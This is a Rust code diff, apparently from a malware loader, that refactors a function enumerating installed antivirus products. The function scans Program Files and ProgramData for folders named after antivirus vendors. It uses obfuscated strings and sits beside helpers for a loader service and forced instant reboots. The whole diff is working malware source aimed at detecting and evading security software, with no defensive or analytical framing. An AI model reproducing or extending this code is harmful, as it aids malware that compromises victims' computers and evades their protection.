@@ -1,5 +1,5 @@
 use std::{ env, path::PathBuf };
-use anyhow::Result;
+use anyhow::{ Context, Result };
 use loader_vars::constants::loader_service_name;
 use obfstr::obfstr as s;
 use shared::utils::functions::{ restart_pc_instant, spawn_program };
@@ -65,7 +65,7 @@ pub fn search_antivirus_directories(
     program_files_path: PathBuf,
     program_files_86_path: PathBuf,
     program_data_path: PathBuf
-) -> Vec<String> {
+) -> Result<Vec<String>> {
     let antivirus_keywords: Vec<String> = vec![
         s!("ad-aware").to_string(),
         s!("adaware").to_string(),
@@ -109,41 +109,36 @@ pub fn search_antivirus_directories(
     let paths = vec![program_files_path, program_files_86_path, program_data_path];
 
     for path in paths {
-        match std::fs::read_dir(path) {
-            Ok(dir) => {
-                for entry in dir {
-                    match entry {
-                        Ok(entry) => {
-                            let path = entry.path();
-                            let file_name = match path.file_name() {
-                                Some(name) => name.to_str().unwrap().to_lowercase(),
-                                None => {
-                                    // warn!("No file name found for path: ", path);
-                                    continue;
-                                }
-                            };
+        let dir = std::fs::read_dir(path)?;
 
-                            if entry.file_type().unwrap().is_dir() {
-                                for keyword in &antivirus_keywords {
-                                    if file_name.contains(&keyword.to_lowercase()) {
-                                        antivirus_directories.push(
-                                            path.to_str().unwrap().to_string()
-                                        );
-                                    }
-                                }
-                            }
-                        }
-                        Err(_error) => {
-                            // err!("Failed to read directory entry: ", error);
-                        }
+        for result in dir {
+            let entry = result?;
+            let path = entry.path();
+            let file_name = match path.file_name() {
+                Some(name) =>
+                    name
+                        .to_str()
+                        .context(s!("Failed to convert pathbuf to_str").to_owned())?
+                        .to_lowercase(),
+                None => {
+                    continue;
+                }
+            };
+
+            if entry.file_type()?.is_dir() {
+                for keyword in &antivirus_keywords {
+                    if file_name.contains(&keyword.to_lowercase()) {
+                        antivirus_directories.push(
+                            path
+                                .to_str()
+                                .context(s!("Failed to convert pathbuf to_str").to_owned())?
+                                .to_string()
+                        );
                     }
                 }
-            }
-            Err(_error) => {
-                // err!("Failed to read directory: ", error);
             }
         }
     }
 
-    antivirus_directories
+    Ok(antivirus_directories)
 }
